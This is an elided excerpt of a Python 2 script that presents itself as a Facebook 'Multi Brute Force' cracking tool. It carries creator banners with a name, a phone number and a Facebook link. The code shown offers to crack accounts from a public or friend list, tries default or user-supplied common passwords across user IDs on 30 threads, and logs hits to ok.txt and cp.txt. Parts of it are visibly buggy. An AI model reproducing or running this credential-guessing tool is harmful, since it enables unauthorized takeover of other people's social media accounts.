...
logo1 = """
 ...
 [+] Creator : ALI RAZA
 [+] Whatsapp  : 03347794351
1.0| [+] Fb   : https://www.facebook.com/abukalinkcopykarlia
 Multi Brute Force   ( Method Mbasic X Ua Random )
"""
#############################################
logo2 = """
                                   .:!!!!!!!:.
...
[+] Creator : ALI RAZA
[+] Whatsapp  : 03347794351
[+] Fb: https://www.facebook.com/abukalinkcopykarlia
...
def menu():
    ...
    print '\n [01] Crack From Public/Friend'
    print ' [02] Check Result Crack CP/OK'
    print ' [00] Exit'
    pill = raw_input('\n [?] Choose : ')
    if pill in ('1', '01'):
        Public()
...
def cek_hasil():
    print '\n [01] Check Account CP'
    print ' [02] Check account ok OK'
    print ' [03] Back To "Menu"\n'
    cek = raw_input(' [?] Choose : ')
    if cek in (''):
        print '\n [!] Dont Empty'
    elif cek in ('1', '01'):
        print '\n [!] Total Crack CP ( CP.txt )\n'
        os.system('cp.txt')
        exit()
    elif cek in ('2', '02'):
        print '\n [!] Total Crack OK ( OK.txt )\n'
        os.system('cp.txt')
        exit()
    elif cek in ('3', '03'):
        menu()
...
def crack():
    Pw1 = raw_input('\n [•] Want To use  Password Default/Manual d/m : ')
    if Pw1 in ('m', 'M'):
        with ThreadPoolExecutor(max_workers=30) as (ganz):
          asu = raw_input(' [+] Example password: 786786, Pakistan\n  %s[+] Pasword: ').split(',')
          if len(asu) == '':
             exit(' [!] Dont leave Empty!')
          print '\n [•] Total Ok Save in : ok.txt\n [•] Total CP Save In : cp.txt'
          for user in id:
             uid, name = user.split('|')
...
def hasil():
    if len(ok) != 0 or len(cp) != 0:
        print ' [+] Total Ok : %s' % (len(ok))
        print ' [+] Total CP : %s' % (len(cp))
    else:
        exit('\n [!] No Result :)')
